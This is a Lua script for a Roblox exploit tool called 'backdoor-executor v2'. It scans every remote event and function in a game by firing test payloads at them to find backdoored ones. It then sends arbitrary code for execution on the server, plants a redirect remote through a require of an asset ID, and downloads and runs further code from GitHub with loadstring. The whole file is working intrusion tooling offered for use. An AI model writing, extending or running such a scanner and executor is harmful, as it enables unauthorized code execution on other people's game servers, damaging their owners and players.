-- services
local httpService = game:GetService("HttpService")
local jointsService = game:GetService("JointsService")
local starterGui = game:GetService("StarterGui")
-- variables
local config
local execGuiAPI
local debugSource = [[
local stdout = table.create(512)
local execSucc, result do
	local env = getfenv(0)
	env.print = function(...)
		table.insert(stdout, {"print", workspace:GetServerTimeNow(), ...})
	end
	env.warn = function(...)
		table.insert(stdout, {"warn", workspace:GetServerTimeNow(), ...})
	end
	local function main() %s end

	execSucc, result = pcall(setfenv(main, env))
end

local stdObj = Instance.new("BoolValue")
stdObj.Name, stdObj.Value, stdObj.Parent = "%s", execSucc, game:GetService("JointsService")

if not execSucc then
	stdObj:SetAttribute("stderr", result)
end
if #stdout > 0 then
	stdObj:SetAttribute("stdout", game:GetService("HttpService"):JSONEncode(stdout))
end
task.delay(1, stdObj.Destroy, stdObj)
]]
local testSource = [[local _val=Instance.new("StringValue");_val.Name,_val.Parent,_val.Value="%s",game:GetService("JointsService"),"%s";task.delay(1, _val.Destroy, _val)]]
local stringList = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890!@#$%^&*()_+{}:"
local configRaw = (
	if isfile("bexe-config.lua") then
		readfile("bexe-config.lua")
	else
		game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/scripts/main/backdoor-executor/bexe-config.lua")
)
local scannedRemotes = table.create(128)
local remoteInfo = {
	["foundBackdoor"] = false,
	["instance"] = nil,
	["args"] = {"source"},
	["argSrcIndex"] = 1,
	["srcFunc"] = nil
}
local msgOutputs = {
	["outdatedCache"] = "Failed to load the backdoor cache of [%s], it might be outdated.",
	["outdatedConfig"] = "backdoor-executor.lua configuration is outdated! \nIt is recommended to update the configuration to prevent errors.",
	["noBackdoorRemote"] = "No backdoored remote(s) can be found here!",
	["configCantLoad"] = "Local configuration cannot be loaded, overwriting.",
	["attached"] = "\n Attached Remote: %s\n Type: %s",
	["scanBenchmark"] = "Took %.2f second(s) to scan remotes.",
	["failedRemoteRedirection"] = "Remote redirection took too long to load, using original remote.",
	["printRemote"] = "\n Remote: %s\n Type: %s",
	["mainTabText"] = "--[[\n\tbackdoor-executor.lua loaded!\n\tUsing 'github.com/jLn0n/executor-gui' for interface.\n--]]\n",
}
local stringifiedTypes = {
	EnumItem = function(value)
		return string.format("Enum.%s.%s", value.EnumType, value.Name)
	end,
	CFrame = function(value)
		return string.format("CFrame.new(%s)", tostring(value))
	end,
	Vector3 = function(value)
		return string.format("Vector3.new(%s)", tostring(value))
	end,
	BrickColor = function(value)
		return string.format("BrickColor.new(\"%s\")", value.Name)
	end,
	Color3 = function(value)
		return string.format("Color3.new(%s)", tostring(value))
	end,
	string = function(value)
		return string.format("\"%s\"", value)
	end,
	number = function(value)
		return string.format("%2.f", value)
	end,
	Ray = function(value)
		return string.format("Ray.new(Vector3.new(%s), Vector3.new(%s))", tostring(value.Origin), tostring(value.Direction))
	end
}
-- functions
local function sendNotification(text)
	return starterGui:SetCore("SendNotification", {
		Title = "[backdoor-executor v2]",
		Text = text,
		Duration = 5
	})
end

local function pathToInstance(strPath)
	local pathSplit = string.split(strPath, ".")
	local result = game

	for _, pathName in pathSplit do
		if not result then return end
		result = result:FindFirstChild(pathName) or nil
	end
	return result
end

local function generateRandString(lenght)
	local result = ""

	for _ = 1, lenght do
		local randInteger = math.random(1, #stringList)
		result ..= string.sub(stringList, randInteger, randInteger)
	end
	return result
end

local function isRemoteAllowed(object)
	if not object then return end
	local objectPath = object:GetFullName()

	if (not (object:IsA("RemoteEvent") or object:IsA("RemoteFunction"))) or
		table.find(scannedRemotes, objectPath)
	then
		return false
	end

	for filterName, filterFunc in config.remoteFilters do
		if not filterFunc(object) then continue end
		return false
	end
	return true
end

local function getRemotes()
	local remotes = table.create(128)

	for _, object in game:GetDescendants() do
		if not isRemoteAllowed(object) then continue end
		table.insert(remotes, object)
	end

	if getnilinstances then
		for _, object in getnilinstances() do
			if not isRemoteAllowed(object) then continue end
			table.insert(remotes, object)
		end
	end
	return remotes
end

local function getStringifiedType(value)
	local stringifier = stringifiedTypes[typeof(value)]

	return (
		if stringifier then
			stringifier(value)
		else
			tostring(value)
	)
end

local function applyMacros(source)
	for macroName, macroValue in config.scriptMacros do
		macroValue = getStringifiedType(
			if typeof(macroValue) == "function" then
				macroValue(macroValue)
			else
				macroValue
		)
		source = string.gsub(source, "%%" .. macroName .. "%%", macroValue)
	end
	return source
end

local function getRemoteFunc(object)
	return (
		if object:IsA("RemoteEvent") then
			object.FireServer
		elseif object:IsA("RemoteFunction") then
			object.InvokeServer
		else nil
	)
end

local function execScript(source, _sourceName, noRedirectOutput)
	if not remoteInfo.foundBackdoor then return end
	source = applyMacros(source)
	local remoteFunc = getRemoteFunc(remoteInfo.instance)

	if (config.redirectOutput and not noRedirectOutput) then
		local nonce = generateRandString(25)
		source = string.format(debugSource, source, nonce)

		local connection
		connection = jointsService.ChildAdded:Connect(function(object)
			if object.Name == nonce then connection:Disconnect()
				local rawStdout = object:GetAttribute("stdout")
				local jsonConvertSucc, stdout = pcall(httpService.JSONDecode, httpService, rawStdout)

				if jsonConvertSucc and typeof(stdout) == "table" then
					for _, output in stdout do
						local outputType, timestamp = output[1], output[2]
						output = table.concat(output, " ", 3)

						execGuiAPI.console.createOutput(
							output,
							(if outputType == "print" then
								Enum.MessageType.MessageOutput
							elseif outputType == "warn" then
								Enum.MessageType.MessageWarning
							else nil),
							timestamp
						)
					end
				end

				if not object.Value then
					execGuiAPI.console.createOutput(object:GetAttribute("stderr"), Enum.MessageType.MessageError)
				end
			end
		end)
		task.delay(60, connection.Disconnect, connection)
	end

	remoteInfo.args[remoteInfo.argSrcIndex] = (if remoteInfo.srcFunc then remoteInfo.srcFunc(source) else source)
	task.spawn(remoteFunc, remoteInfo.instance, unpack(remoteInfo.args))
end

local function initializeRemoteInfo(params)
	if remoteInfo.foundBackdoor then return end

	remoteInfo.foundBackdoor = true
	for name, value in params do
		remoteInfo[name] = value
	end
end

local function onAttached(remoteObj, params)
	if not remoteObj or remoteInfo.foundBackdoor then return end
	getgenv().__BEXELUAATTACHED = true
	print(string.format(msgOutputs.attached, remoteObj:GetFullName(), remoteObj.ClassName))
	sendNotification("Attached!")
	initializeRemoteInfo(params or {
		["instance"] = remoteObj,
	})

	if config.redirectRemote then
		local redirectedRemote = jointsService:FindFirstChildWhichIsA("RemoteEvent")
		if not redirectedRemote or not redirectedRemote:GetAttribute("bexeremote") then
			execScript("require(11906423264)(%userid%)", nil, true)
			redirectedRemote = jointsService:WaitForChild("bexe-remote", 5)
		end

		if redirectedRemote then
			remoteInfo.instance = redirectedRemote
			remoteInfo.argSrcIndex = 1
			remoteInfo.args = {"source"}
		else
			warn(msgOutputs.failedRemoteRedirection)
		end
	end

	execGuiAPI = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/executor-gui/main/src/loader.lua"))({
		customMainTabText = msgOutputs.mainTabText,
		customExecution = true,
		executeFunc = execScript,
	})
	for _, scriptSrc in config.autoExec do
		execScript(scriptSrc)
	end
end

local function findBackdoors()
	if remoteInfo.foundBackdoor then return end
	local nonce = generateRandString(25)
	local connection
	connection = jointsService.ChildAdded:Connect(function(object)
		if object:IsA("StringValue") and
			object.Name == nonce and
			object.Value ~= ""
		then connection:Disconnect()
			task.spawn(onAttached, pathToInstance(object.Value))
		end
	end)

	for _, object in getRemotes() do task.wait()
		if remoteInfo.foundBackdoor then break end
		local remoteFunc, objectPath = getRemoteFunc(object), object:GetFullName()

		print(string.format(msgOutputs.printRemote, object:GetFullName(), object.ClassName))
		pcall(task.spawn, remoteFunc, object, string.format(testSource, nonce, objectPath))
		table.insert(scannedRemotes, objectPath)
	end
	table.clear(scannedRemotes)
	connection:Disconnect()
end
-- main
do -- "initialization"?
	if not isfile("bexe-config.lua") then
		writefile("bexe-config.lua", configRaw)
	else
		local succ, loadedConfig = pcall(loadstring(configRaw))

		if (not succ) then
			warn(msgOutputs.configCantLoad)
			configRaw = game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/scripts/main/backdoor-executor/bexe-config.lua")

			writefile("bexe-config.lua", configRaw)
			loadedConfig = loadstring(configRaw)()
		end

		if loadedConfig.configVer < 5 then warn(msgOutputs.outdatedConfig) end
		config = loadedConfig
	end
end
do -- backdoor finding
	if not getgenv().__BEXELUAATTACHED then
		sendNotification("Press F9 to see the remotes being scanned.")
		local placeCacheData = if (typeof(config) == "table" and config.cachedPlaces) then config.cachedPlaces[game.PlaceId] else nil

		if placeCacheData then
			local successCount = 0
			local remoteObj = pathToInstance(placeCacheData.Path)
			local argSrcIndex = (typeof(placeCacheData.Args) == "table" and table.find(placeCacheData.Args, "source"))

			successCount += (if typeof(remoteObj) == "Instance" then 1 else 0)
			successCount += (if (successCount == 1 and (remoteObj:IsA("RemoteEvent") or remoteObj:IsA("RemoteFunction"))) then 1 else 0)
			successCount += (if argSrcIndex then 1 else 0)

			if successCount >= 3 then
				onAttached(remoteObj, {
					["instance"] = remoteObj,
					["srcFunc"] = placeCacheData.SourceFunc,
					["args"] = placeCacheData.Args,
					["argSrcIndex"] = argSrcIndex
				})
			else
				warn(string.format(msgOutputs.outdatedCache, game.PlaceId))
			end
		end
		if (not placeCacheData or not remoteInfo.foundBackdoor) then -- scan first
			local startTime = os.clock()
			findBackdoors()
			print(string.format(msgOutputs.scanBenchmark, os.clock() - startTime))
		end

		if not remoteInfo.foundBackdoor then -- if no backdoor found
			print(msgOutputs.noBackdoorRemote)
			sendNotification(msgOutputs.noBackdoorRemote)
		end
	else
		sendNotification("Already attached!")
	end
end
